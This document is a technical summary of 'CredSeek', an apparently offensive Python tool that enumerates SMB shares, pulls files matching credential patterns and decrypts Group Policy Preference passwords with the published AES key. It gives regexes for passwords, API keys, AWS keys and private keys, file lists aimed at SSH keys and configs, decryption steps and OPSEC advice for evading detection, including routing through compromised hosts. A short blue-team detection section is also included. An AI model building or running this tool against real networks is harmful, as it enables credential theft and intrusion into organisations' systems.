# CredSeek Technical Summary

## Architecture Overview

**Purpose:** Automated credential harvesting from SMB shares, files, and Group Policy Preferences

**Language:** Python 3.6+  
**Threading:** ThreadPoolExecutor (configurable workers)  
**Dependencies:** smbclient (core), python-docx/openpyxl (optional)  
**Lines of Code:** ~950  

---

## Core Components

### 1. SMB Share Enumeration
**Function:** `check_smb_shares(target, domain, username, password)`

**Process:**
1. Construct smbclient command: `smbclient -L //target -N` (null session) or with credentials
2. Parse output to extract share names
3. Filter out system shares (IPC$, ADMIN$, C$) unless administrative
4. Return list of accessible shares

**Output:** List of share names per target

### 2. File Discovery
**Function:** `search_share_for_files(target, share, patterns, domain, username, password)`

**Process:**
1. Mount share via smbclient
2. Recursively list all files: `recurse ON; ls`
3. Match filenames against pattern dictionaries
4. Track file paths for later analysis
5. Handle permission errors gracefully

**Pattern Matching:**
- **Exact match:** `password.txt`, `.env`, `id_rsa`
- **Wildcard match:** `*password*.txt`, `*config*.php`, `*.backup`
- **Extension match:** `.pem`, `.key`, `.ps1`, `.sh`

**Output:** List of file paths matching patterns

### 3. Credential Extraction
**Function:** `extract_credentials_from_text(text, source_file)`

**Process:**
1. Read file content (up to 1MB limit)
2. Apply regex patterns for each credential type
3. Capture surrounding context (50 chars before/after)
4. Deduplicate findings
5. Classify by type (password, api_key, token, etc.)

**Regex Patterns:**
```python
CRED_PATTERNS = {
    'password': [
        r'password\s*[:=]\s*["\']?([^"\'\s\n]{3,})',
        r'pwd\s*[:=]\s*["\']?([^"\'\s\n]{3,})',
        r'DB_PASSWORD\s*[:=]\s*["\']?([^"\'\s\n]{3,})'
    ],
    'api_key': [
        r'api_key\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})',
        r'API_TOKEN\s*[:=]\s*["\']?([A-Za-z0-9_-]{20,})'
    ],
    'aws_key': [
        r'(AKIA[A-Z0-9]{16})',
        r'aws_secret_access_key\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})'
    ],
    'db_connection': [
        r'(jdbc:[^\s\'"]+)',
        r'(mongodb://[^\s\'"]+)',
        r'(mysql://[^\s\'"]+)'
    ],
    'private_key': [
        r'(-----BEGIN (?:RSA |DSA |EC |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |DSA |EC |)PRIVATE KEY-----)'
    ]
}
```

**Output:** List of credential dictionaries with type, value, context

### 4. GPP Password Decryption
**Function:** `check_gpp_passwords(domain_controllers, domain, username, password)`

**Process:**
1. Access SYSVOL share on each DC: `\\DC\SYSVOL\domain\Policies`
2. Recursively search for XML files: `Groups.xml`, `ScheduledTasks.xml`, `DataSources.xml`
3. Parse XML for `cpassword` attributes
4. Decrypt using Microsoft-published AES-256 key
5. Extract associated username from XML

**Decryption Algorithm:**
```python
# Microsoft published the AES key (MS14-025)
AES_KEY = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'

# Process:
1. Base64 decode the cpassword value
2. Add padding if necessary (multiple of 16 bytes)
3. Decrypt using AES-256-CBC with IV of zeros
4. Remove PKCS7 padding
5. Decode UTF-16-LE to get plaintext password
```

**XML Example:**
```xml
<Properties action="U" 
  userName="Administrator"
  cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
  .../>
```

**Output:** Username/password pairs from GPP

---

## File Pattern Dictionary

### CRED_FILE_PATTERNS
```python
{
    'password_files': [
        '*password*.txt', '*passwords*.xlsx', '*creds*.docx',
        '*secret*.txt', '*login*.txt', 'pwd.txt'
    ],
    'config_files': [
        '*.env', 'config.php', 'web.config', 'app.config',
        'application.properties', 'appsettings.json', 
        'database.yml', 'credentials.xml', 'settings.ini'
    ],
    'ssh_keys': [
        'id_rsa', 'id_dsa', 'id_ecdsa', '*.pem', 
        '*.key', 'authorized_keys', 'known_hosts'
    ],
    'backup_files': [
        '*.backup', '*.bak', '*.old', '*~', '*.save'
    ],
    'script_files': [
        '*.ps1', '*.bat', '*.cmd', '*.sh', 
        '*.py', '*.rb', '*.pl'
    ],
    'git_repos': [
        '.git/config'
    ]
}
```

### INTERESTING_PATHS
```python
[
    'SYSVOL',    # GPP passwords
    'NETLOGON',  # Login scripts
    'Backup',    # Backup configs
    'Scripts',   # Automation
    'Config',    # Configuration files
    'IT_Share',  # Admin tools
    'Software'   # Installation files
]
```

---

## Threading Model

### ThreadPoolExecutor Configuration
```python
max_workers = args.threads  # Default: 10
executor = ThreadPoolExecutor(max_workers=max_workers)
```

### Concurrency Strategy
1. **Level 1:** Parallel target scanning
   - Each target processed by separate thread
   - Enumerate shares concurrently

2. **Level 2:** Parallel share scanning
   - Each share on a target scanned separately
   - File discovery in parallel

3. **Level 3:** Sequential file analysis
   - Files downloaded and analyzed one at a time
   - Prevents overwhelming the target

### Thread Safety
- All output uses locks to prevent race conditions
- Results collected in thread-safe data structures
- Progress tracking with atomic operations

---

## Performance Characteristics

### Time Complexity
- **Share enumeration:** O(n) where n = number of targets
- **File discovery:** O(m) where m = number of shares
- **Credential extraction:** O(f) where f = number of files

### Memory Usage
- **File size limit:** 1MB per file (prevents memory exhaustion)
- **Result buffering:** Credentials stored in memory
- **Streaming:** Large files skipped automatically

### Network Impact
- **Connection pooling:** Not implemented (new connection per share)
- **Bandwidth:** Low (only downloads matching files)
- **Request rate:** Controlled by thread count

### Optimization Techniques
1. **Pattern pre-filtering:** Only download matching files
2. **Size limits:** Skip large files (>1MB)
3. **Early termination:** Stop on first error per share
4. **Deduplication:** Track seen files to avoid re-downloading

---

## Output Format

### Text Output (found_creds.txt)
```
[FILE: \\192.168.1.100\IT_Share\passwords.txt]
Type: password
Value: password="SuperSecret123"
Context: admin password="SuperSecret123" database
Timestamp: 2025-10-13 10:30:45

[FILE: \\192.168.1.100\Backup\config.php]
Type: db_connection
Value: mysql://root:dbpass@localhost/webapp
Context: $db = mysql://root:dbpass@localhost/webapp
Timestamp: 2025-10-13 10:31:12
```

### JSON Output (cred_details.json)
```json
{
  "scan_date": "2025-10-13T10:30:00",
  "targets_scanned": 10,
  "shares_found": 25,
  "files_found": 150,
  "credentials_extracted": 45,
  "gpp_passwords": 3,
  "findings": [
    {
      "target": "192.168.1.100",
      "share": "IT_Share",
      "file": "passwords.txt",
      "full_path": "\\\\192.168.1.100\\IT_Share\\passwords.txt",
      "credential_type": "password",
      "value": "password=\"SuperSecret123\"",
      "context": "admin password=\"SuperSecret123\" database",
      "timestamp": "2025-10-13T10:30:45"
    }
  ],
  "gpp_findings": [
    {
      "domain_controller": "dc01.corp.local",
      "file": "Groups.xml",
      "username": "Administrator",
      "encrypted": "edBSH...",
      "decrypted": "P@ssw0rd123!",
      "policy_path": "\\\\dc01\\SYSVOL\\CORP\\Policies\\{...}"
    }
  ]
}
```

---

## Security Considerations

### Detection Vectors
1. **SMB enumeration logs** - Multiple share access attempts
2. **File access auditing** - Reading many files from shares
3. **SYSVOL access** - Reading GPP XML files
4. **Network traffic** - Large number of SMB connections

### OPSEC Recommendations
1. **Use valid credentials** - Blend with normal user activity
2. **Limit threading** - Reduce connection rate
3. **Target specific shares** - Avoid shotgun approach
4. **Time delays** - Add sleep between operations (not implemented)

### Blue Team Detection
**Indicators:**
- Rapid share enumeration from single source
- Access to SYSVOL by non-admin accounts
- Bulk file downloads from multiple shares
- Reading GPP XML files

**Detection Rules:**
```
# Excessive share enumeration
source_ip AND event_id=5140 AND count > 20 IN 60s

# SYSVOL Groups.xml access
path="*\\SYSVOL\\*\\Groups.xml" AND user != "SYSTEM"

# Null session attempts
event_id=5140 AND user="ANONYMOUS LOGON"
```

---

## Algorithm Efficiency

### Share Enumeration
```
Time: O(n * s)
  n = number of targets
  s = average shares per target
Space: O(n * s)
```

### File Discovery
```
Time: O(m * f)
  m = number of shares
  f = average files per share
Space: O(matched_files)
```

### Credential Extraction
```
Time: O(f * p * l)
  f = number of files
  p = number of patterns
  l = average file length
Space: O(extracted_creds)
```

### GPP Decryption
```
Time: O(d * x)
  d = number of DCs
  x = number of XML files
Space: O(decrypted_passwords)
```

---

## Comparison to Similar Tools

| Feature | CredSeek | Snaffler | PowerSploit Get-GPPPassword | Impacket smbclient |
|---------|----------|----------|----------------------------|-------------------|
| SMB enumeration | ✅ | ✅ | ❌ | ✅ |
| File pattern matching | ✅ | ✅ | ❌ | ❌ |
| Content analysis | ✅ | ✅ | ❌ | ❌ |
| GPP decryption | ✅ | ✅ | ✅ | ❌ |
| Cross-platform | ✅ | ❌ (Windows) | ❌ (Windows) | ✅ |
| Multi-threaded | ✅ | ✅ | ❌ | ❌ |
| JSON output | ✅ | ✅ | ❌ | ❌ |
| No dependencies | ❌ (smbclient) | ❌ (.NET) | ❌ (PowerShell) | ❌ (Impacket) |

**Advantages:**
- Cross-platform (Linux/Windows)
- Built-in GPP decryption
- Comprehensive pattern matching
- JSON output for automation

**Disadvantages:**
- Requires smbclient binary
- No SMB2/SMB3 optimization
- Limited to text-based credential extraction
- No database/KeePass parsing

---

## Error Handling

### Connection Errors
```python
try:
    # SMB connection
except subprocess.TimeoutExpired:
    print("[-] Connection timeout")
except subprocess.CalledProcessError:
    print("[-] SMB error - access denied")
```

### File Access Errors
```python
try:
    # File download
except PermissionError:
    print("[-] Permission denied")
    continue  # Skip file, continue scan
except FileNotFoundError:
    print("[-] File not found (may have been deleted)")
```

### Decryption Errors
```python
try:
    # GPP password decryption
except (ValueError, binascii.Error):
    print("[-] Invalid cpassword format")
except Exception as e:
    print(f"[-] Decryption error: {e}")
```

---

## Future Enhancements

### Planned Features
1. **Native SMB library** - Remove smbclient dependency
2. **KeePass parsing** - Extract from .kdbx files
3. **Office document parsing** - Extract from .docx/.xlsx
4. **Entropy analysis** - Detect base64/encoded credentials
5. **Password strength analysis** - Classify weak passwords
6. **Credential validation** - Test extracted credentials
7. **LAPS password extraction** - From AD attributes
8. **CPassword hash cracking** - For corrupted GPP files

### Performance Improvements
1. **Connection pooling** - Reuse SMB connections
2. **Async I/O** - Non-blocking file operations
3. **Incremental scanning** - Resume interrupted scans
4. **Smart filtering** - ML-based credential detection

### OPSEC Improvements
1. **Rate limiting** - Configurable delay between operations
2. **Random delays** - Jitter to avoid pattern detection
3. **Proxy support** - Route through compromised hosts
4. **Custom user-agents** - Blend with normal traffic

---

## Technical Notes

### GPP AES Key Origin
Microsoft published the AES-256 key in their documentation (MS14-025). The key is:
```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

This was a critical design flaw - encrypting passwords with a publicly known key.

### SMB Authentication Levels
1. **Null Session** - No credentials, limited access
2. **Guest** - Guest account, read-only shares
3. **User** - Domain/local user, standard access
4. **Admin** - Administrative shares (C$, ADMIN$)

### File Size Limits
Files larger than 1MB are skipped to prevent:
- Memory exhaustion
- Long download times
- False positives (binary files, logs)

### Regex Performance
Regex patterns are compiled once and reused:
```python
compiled_patterns = {
    key: [re.compile(p, re.IGNORECASE) for p in patterns]
    for key, patterns in CRED_PATTERNS.items()
}
```

---

**Version:** 1.0  
**Status:** Production Ready  
**Tested On:** Kali Linux 2024.1, Ubuntu 22.04  
**Python Version:** 3.6+
